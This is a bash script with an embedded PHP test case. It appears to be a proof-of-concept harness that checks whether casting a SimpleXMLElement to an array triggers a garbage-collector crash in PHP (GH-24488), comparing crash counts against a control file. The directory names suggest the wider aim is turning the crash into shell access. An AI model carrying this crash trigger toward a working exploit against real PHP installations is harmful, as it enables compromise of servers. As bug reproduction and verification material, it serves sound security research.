#!/bin/bash
# Coordinator verification: zero2 escalation control experiment.
# A = with materialization (arms GH-24488) -> expect ~10-30% crashes
# B = without materialization (control)    -> expect 0 crashes
P=/tmp/php8512_build/plain2/sapi/cli/php
cd /tmp/poc || exit 1
cp /mnt/c/Users/andre/Downloads/php2shell-claude/poc_matrix/p32_control.php .

cat > p37_armed.php <<'EOF'
<?php
$n = 1000;
$parts = [];
for ($i = 0; $i < $n; $i++) { $parts[] = "<c$i>v$i</c$i>"; }
$xml = new SimpleXMLElement('<root>' . implode('', $parts) . '</root>');
$x = (array)$xml;   // MATERIALIZATION: arms GH-24488
$w = new stdClass();
$w->self = $w;
$w->x = $xml;
unset($xml, $x, $w);
gc_collect_cycles();
echo "armed survived\n";
EOF

A=0; B=0
for i in $(seq 1 10); do
  timeout 20 $P -n -d zend.enable_gc=1 p37_armed.php > /dev/null 2>&1
  ec=$?
  [ $ec -ge 128 ] 2>/dev/null && A=$((A+1))
  timeout 20 $P -n -d zend.enable_gc=1 p32_control.php > /dev/null 2>&1
  ec=$?
  [ $ec -ge 128 ] 2>/dev/null && B=$((B+1))
done
echo "ARMED(with materialization) crashes: $A/10   CONTROL(no materialization) crashes: $B/10"
